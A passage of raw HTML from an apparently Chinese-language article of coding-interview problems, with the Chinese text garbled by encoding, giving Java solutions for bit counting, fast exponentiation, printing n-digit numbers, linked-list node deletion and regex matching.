href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/8ee967e43c2c4ec193b040ea7fbb10b8%3FtpId%3D13%26tqId%3D11164%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>è¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼Œè¾“å‡ºè¯¥æ•°äºŒè¿›åˆ¶è¡¨ç¤ºä¸­ 1 çš„ä¸ªæ•°ã€‚</p><h3>n&amp;(n-1)</h3><p>è¯¥ä½è¿ç®—å»é™¤ n çš„ä½çº§è¡¨ç¤ºä¸­æœ€ä½çš„é‚£ä¸€ä½ã€‚</p><div class=\"highlight\"><pre><code class=\"language-text\">n       : 10110100\nn-1     : 10110011\nn&amp;(n-1) : 10110000</code></pre></div><p>æ—¶é—´å¤æ‚åº¦ï¼šO(M)ï¼Œå…¶ä¸­ M è¡¨ç¤º 1 çš„ä¸ªæ•°ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">NumberOf1</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">!=</span> <span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">cnt</span><span class=\"o\">++;</span>\n        <span class=\"n\">n</span> <span class=\"o\">&amp;=</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">cnt</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h3>Integer.bitCount()</h3><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">NumberOf1</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">return</span> <span class=\"n\">Integer</span><span class=\"o\">.</span><span class=\"na\">bitCount</span><span class=\"o\">(</span><span class=\"n\">n</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><h2>16. æ•°å€¼çš„æ•´æ•°æ¬¡æ–¹</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/1a834e5e3e1a4b7ba251417554e07c00%3FtpId%3D13%26tqId%3D11165%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>ç»™å®šä¸€ä¸ª double ç±»å‹çš„æµ®ç‚¹æ•° base å’Œ int ç±»å‹çš„æ•´æ•° exponentï¼Œæ±‚ base çš„ exponent æ¬¡æ–¹ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><p>ä¸‹é¢çš„è®¨è®ºä¸­ x ä»£è¡¨ baseï¼Œn ä»£è¡¨ exponentã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-223e447dd1e31ed7c1c35d4db84c39cb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"418\" data-rawheight=\"93\" class=\"content_image\" width=\"418\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;418&#39; height=&#39;93&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"418\" data-rawheight=\"93\" class=\"content_image lazy\" width=\"418\" data-actualsrc=\"https://pic4.zhimg.com/v2-223e447dd1e31ed7c1c35d4db84c39cb_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>å› ä¸º (x*x)n/2 å¯ä»¥é€šè¿‡é€’å½’æ±‚è§£ï¼Œå¹¶ä¸”æ¯æ¬¡é€’å½’ n éƒ½å‡å°ä¸€åŠï¼Œå› æ­¤æ•´ä¸ªç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ä¸º O(logN)ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">double</span> <span class=\"nf\">Power</span><span class=\"o\">(</span><span class=\"kt\">double</span> <span class=\"n\">base</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">exponent</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">exponent</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">exponent</span> <span class=\"o\">==</span> <span class=\"n\">1</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">base</span><span class=\"o\">;</span>\n    <span class=\"kt\">boolean</span> <span class=\"n\">isNegative</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">exponent</span> <span class=\"o\">&lt;</span> <span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">exponent</span> <span class=\"o\">=</span> <span class=\"o\">-</span><span class=\"n\">exponent</span><span class=\"o\">;</span>\n        <span class=\"n\">isNegative</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"kt\">double</span> <span class=\"n\">pow</span> <span class=\"o\">=</span> <span class=\"n\">Power</span><span class=\"o\">(</span><span class=\"n\">base</span> <span class=\"o\">*</span> <span class=\"n\">base</span><span class=\"o\">,</span> <span class=\"n\">exponent</span> <span class=\"o\">/</span> <span class=\"n\">2</span><span class=\"o\">);</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">exponent</span> <span class=\"o\">%</span> <span class=\"n\">2</span> <span class=\"o\">!=</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"n\">pow</span> <span class=\"o\">=</span> <span class=\"n\">pow</span> <span class=\"o\">*</span> <span class=\"n\">base</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"n\">isNegative</span> <span class=\"o\">?</span> <span class=\"n\">1</span> <span class=\"o\">/</span> <span class=\"n\">pow</span> <span class=\"o\">:</span> <span class=\"n\">pow</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>17. æ‰“å°ä» 1 åˆ°æœ€å¤§çš„ n ä½æ•°</h2><h2>é¢˜ç›®æè¿°</h2><p>è¾“å…¥æ•°å­— nï¼ŒæŒ‰é¡ºåºæ‰“å°å‡ºä» 1 åˆ°æœ€å¤§çš„ n ä½åè¿›åˆ¶æ•°ã€‚æ¯”å¦‚è¾“å…¥ 3ï¼Œåˆ™æ‰“å°å‡º 1ã€2ã€3 ä¸€ç›´åˆ°æœ€å¤§çš„ 3 ä½æ•°å³ 999ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><p>ç”±äº n å¯èƒ½ä¼šéå¸¸å¤§ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥ç”¨ int è¡¨ç¤ºæ•°å­—ï¼Œè€Œæ˜¯ç”¨ char æ•°ç»„è¿›è¡Œå­˜å‚¨ã€‚</p><p>ä½¿ç”¨å›æº¯æ³•å¾—åˆ°æ‰€æœ‰çš„æ•°ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">print1ToMaxOfNDigits</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">&lt;=</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span><span class=\"o\">;</span>\n    <span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">number</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">char</span><span class=\"o\">[</span><span class=\"n\">n</span><span class=\"o\">];</span>\n    <span class=\"n\">print1ToMaxOfNDigits</span><span class=\"o\">(</span><span class=\"n\">number</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">print1ToMaxOfNDigits</span><span class=\"o\">(</span><span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">number</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">digit</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">digit</span> <span class=\"o\">==</span> <span class=\"n\">number</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">printNumber</span><span class=\"o\">(</span><span class=\"n\">number</span><span class=\"o\">);</span>\n        <span class=\"k\">return</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">10</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"n\">number</span><span class=\"o\">[</span><span class=\"n\">digit</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"kt\">char</span><span class=\"o\">)</span> <span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"sc\">&#39;0&#39;</span><span class=\"o\">);</span>\n        <span class=\"n\">print1ToMaxOfNDigits</span><span class=\"o\">(</span><span class=\"n\">number</span><span class=\"o\">,</span> <span class=\"n\">digit</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">printNumber</span><span class=\"o\">(</span><span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">number</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">index</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">index</span> <span class=\"o\">&lt;</span> <span class=\"n\">number</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">number</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">]</span> <span class=\"o\">==</span> <span class=\"sc\">&#39;0&#39;</span><span class=\"o\">)</span>\n        <span class=\"n\">index</span><span class=\"o\">++;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">index</span> <span class=\"o\">&lt;</span> <span class=\"n\">number</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">)</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">print</span><span class=\"o\">(</span><span class=\"n\">number</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">++]);</span>\n    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><h2>18.1 åœ¨ O(1) æ—¶é—´å†…åˆ é™¤é“¾è¡¨èŠ‚ç‚¹</h2><h2>è§£é¢˜æ€è·¯</h2><p>â‘  å¦‚æœè¯¥èŠ‚ç‚¹ä¸æ˜¯å°¾èŠ‚ç‚¹ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥å°†ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„å€¼èµ‹ç»™è¯¥èŠ‚ç‚¹ï¼Œç„¶åä»¤è¯¥èŠ‚ç‚¹æŒ‡å‘ä¸‹ä¸‹ä¸ªèŠ‚ç‚¹ï¼Œå†åˆ é™¤ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(1)ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-02148f36dc1d29c2cf80551ed6fe3785_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"824\" data-rawheight=\"141\" class=\"origin_image zh-lightbox-thumb\" width=\"824\" data-original=\"https://pic2.zhimg.com/v2-02148f36dc1d29c2cf80551ed6fe3785_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;824&#39; height=&#39;141&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"824\" data-rawheight=\"141\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"824\" data-original=\"https://pic2.zhimg.com/v2-02148f36dc1d29c2cf80551ed6fe3785_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-02148f36dc1d29c2cf80551ed6fe3785_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>â‘¡ å¦åˆ™ï¼Œå°±éœ€è¦å…ˆéå†é“¾è¡¨ï¼Œæ‰¾åˆ°èŠ‚ç‚¹çš„å‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œç„¶åè®©å‰ä¸€ä¸ªèŠ‚ç‚¹æŒ‡å‘ nullï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(N)ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-fb8a5e57dc79de35fb2858548a1aa77c_b.png\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"815\" data-rawheight=\"134\" class=\"origin_image zh-lightbox-thumb\" width=\"815\" data-original=\"https://pic1.zhimg.com/v2-fb8a5e57dc79de35fb2858548a1aa77c_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;815&#39; height=&#39;134&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"815\" data-rawheight=\"134\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"815\" data-original=\"https://pic1.zhimg.com/v2-fb8a5e57dc79de35fb2858548a1aa77c_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-fb8a5e57dc79de35fb2858548a1aa77c_b.png\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>ç»¼ä¸Šï¼Œå¦‚æœè¿›è¡Œ N æ¬¡æ“ä½œï¼Œé‚£ä¹ˆå¤§çº¦éœ€è¦æ“ä½œèŠ‚ç‚¹çš„æ¬¡æ•°ä¸º N-1+N=2N-1ï¼Œå…¶ä¸­ N-1 è¡¨ç¤º N-1 ä¸ªä¸æ˜¯å°¾èŠ‚ç‚¹çš„æ¯ä¸ªèŠ‚ç‚¹ä»¥ O(1) çš„æ—¶é—´å¤æ‚åº¦æ“ä½œèŠ‚ç‚¹çš„æ€»æ¬¡æ•°ï¼ŒN è¡¨ç¤º 1 ä¸ªå°¾èŠ‚ç‚¹ä»¥ O(N) çš„æ—¶é—´å¤æ‚åº¦æ“ä½œèŠ‚ç‚¹çš„æ€»æ¬¡æ•°ã€‚(2N-1)/N \\~ 2ï¼Œå› æ­¤è¯¥ç®—æ³•çš„å¹³å‡æ—¶é—´å¤æ‚åº¦ä¸º O(1)ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ListNode</span> <span class=\"nf\">deleteNode</span><span class=\"o\">(</span><span class=\"n\">ListNode</span> <span class=\"n\">head</span><span class=\"o\">,</span> <span class=\"n\">ListNode</span> <span class=\"n\">tobeDelete</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">head</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">tobeDelete</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">tobeDelete</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"c1\">// è¦åˆ é™¤çš„èŠ‚ç‚¹ä¸æ˜¯å°¾èŠ‚ç‚¹\n</span><span class=\"c1\"></span>        <span class=\"n\">ListNode</span> <span class=\"n\">next</span> <span class=\"o\">=</span> <span class=\"n\">tobeDelete</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"n\">tobeDelete</span><span class=\"o\">.</span><span class=\"na\">val</span> <span class=\"o\">=</span> <span class=\"n\">next</span><span class=\"o\">.</span><span class=\"na\">val</span><span class=\"o\">;</span>\n        <span class=\"n\">tobeDelete</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">next</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">head</span> <span class=\"o\">==</span> <span class=\"n\">tobeDelete</span><span class=\"o\">)</span>\n             <span class=\"c1\">// åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹\n</span><span class=\"c1\"></span>            <span class=\"n\">head</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n        <span class=\"k\">else</span> <span class=\"o\">{</span>\n            <span class=\"n\">ListNode</span> <span class=\"n\">cur</span> <span class=\"o\">=</span> <span class=\"n\">head</span><span class=\"o\">;</span>\n            <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">cur</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">!=</span> <span class=\"n\">tobeDelete</span><span class=\"o\">)</span>\n                <span class=\"n\">cur</span> <span class=\"o\">=</span> <span class=\"n\">cur</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n            <span class=\"n\">cur</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">head</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>18.2 åˆ é™¤é“¾è¡¨ä¸­é‡å¤çš„ç»“ç‚¹</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/fc533c45b73a41b0b44ccba763f866ef%3FtpId%3D13%26tqId%3D11209%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-7767980ebc26313432c83b7320f7638f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"656\" data-rawheight=\"206\" class=\"origin_image zh-lightbox-thumb\" width=\"656\" data-original=\"https://pic4.zhimg.com/v2-7767980ebc26313432c83b7320f7638f_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;656&#39; height=&#39;206&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"656\" data-rawheight=\"206\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"656\" data-original=\"https://pic4.zhimg.com/v2-7767980ebc26313432c83b7320f7638f_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-7767980ebc26313432c83b7320f7638f_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æè¿°</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ListNode</span> <span class=\"nf\">deleteDuplication</span><span class=\"o\">(</span><span class=\"n\">ListNode</span> <span class=\"n\">pHead</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">pHead</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">pHead</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">pHead</span><span class=\"o\">;</span>\n    <span class=\"n\">ListNode</span> <span class=\"n\">next</span> <span class=\"o\">=</span> <span class=\"n\">pHead</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">pHead</span><span class=\"o\">.</span><span class=\"na\">val</span> <span class=\"o\">==</span> <span class=\"n\">next</span><span class=\"o\">.</span><span class=\"na\">val</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">next</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">pHead</span><span class=\"o\">.</span><span class=\"na\">val</span> <span class=\"o\">==</span> <span class=\"n\">next</span><span class=\"o\">.</span><span class=\"na\">val</span><span class=\"o\">)</span>\n            <span class=\"n\">next</span> <span class=\"o\">=</span> <span class=\"n\">next</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"k\">return</span> <span class=\"n\">deleteDuplication</span><span class=\"o\">(</span><span class=\"n\">next</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n        <span class=\"n\">pHead</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">deleteDuplication</span><span class=\"o\">(</span><span class=\"n\">pHead</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">);</span>\n        <span class=\"k\">return</span> <span class=\"n\">pHead</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>19. æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/45327ae22b7b413ea21df13ee7d6429c%3FtpId%3D13%26tqId%3D11205%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>è¯·å®ç°ä¸€ä¸ªå‡½æ•°ç”¨æ¥åŒ¹é…åŒ…æ‹¬ &#39;.&#39; å’Œ &#39;*&#39; çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚æ¨¡å¼ä¸­çš„å­—ç¬¦ &#39;.&#39; è¡¨ç¤ºä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œè€Œ &#39;*&#39; è¡¨ç¤ºå®ƒå‰é¢çš„å­—ç¬¦å¯ä»¥å‡ºç°ä»»æ„æ¬¡ï¼ˆåŒ…å« 0 æ¬¡ï¼‰ã€‚</p><p>åœ¨æœ¬é¢˜ä¸­ï¼ŒåŒ¹é…æ˜¯æŒ‡å­—ç¬¦ä¸²çš„æ‰€æœ‰å­—ç¬¦åŒ¹é…æ•´ä¸ªæ¨¡å¼ã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸² &#34;aaa&#34; ä¸æ¨¡å¼ &#34;a.a&#34; å’Œ &#34;ab*ac*a&#34; åŒ¹é…ï¼Œä½†æ˜¯ä¸ &#34;aa.a&#34; å’Œ &#34;ab*a&#34; å‡ä¸åŒ¹é…ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><p>åº”è¯¥æ³¨æ„åˆ°ï¼Œ&#39;.&#39; æ˜¯ç”¨æ¥å½“åšä¸€ä¸ªä»»æ„å­—ç¬¦ï¼Œè€Œ &#39;*&#39; æ˜¯ç”¨æ¥é‡å¤å‰é¢çš„å­—ç¬¦ã€‚è¿™ä¸¤ä¸ªçš„ä½œç”¨ä¸åŒï¼Œä¸èƒ½æŠŠ &#39;.&#39; çš„ä½œç”¨å’Œ &#39;*&#39; è¿›è¡Œç±»æ¯”ï¼Œä»è€ŒæŠŠå®ƒå½“æˆé‡å¤å‰é¢å­—ç¬¦ä¸€æ¬¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">boolean</span> <span class=\"nf\">match</span><span class=\"o\">(</span><span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">str</span><span class=\"o\">,</span> <span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">pattern</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n\n    <span class=\"kt\">int</span> <span class=\"n\">m</span> <span class=\"o\">=</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">,</span> <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"n\">pattern</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span>\n    <span class=\"kt\">boolean</span><span class=\"o\">[][]</span> <span class=\"n\">dp</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">boolean</span><span class=\"o\">[</span><span class=\"n\">m</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">][</span><span class=\"n\">n</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">];</span>\n\n    <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">][</span><span class=\"n\">0</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">n</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">pattern</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">]</span> <span class=\"o\">==</span> <span class=\"sc\">&#39;*&#39;</span><span class=\"o\">)</span>\n            <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">][</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">][</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">2</span><span class=\"o\">];</span>\n\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">m</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">j</span> <span class=\"o\">&lt;=</span> <span class=\"n\">n</span><span class=\"o\">;</span> <span class=\"n\">j</span><span class=\"o\">++)</span>\n            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">str</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">]</span> <span class=\"o\">==</span> <span class=\"n\">pattern</span><span class=\"o\">[</span><span class=\"n\">j</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">]</span> <span class=\"o\">||</span> <span class=\"n\">pattern</span><span class=\"o\">[</span><span class=\"n\">j</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">]</span> <span class=\"o\">==</span> <span class=\"sc\">&#39;.&#39;</span><span class=\"o\">)</span>\n                <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">][</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span 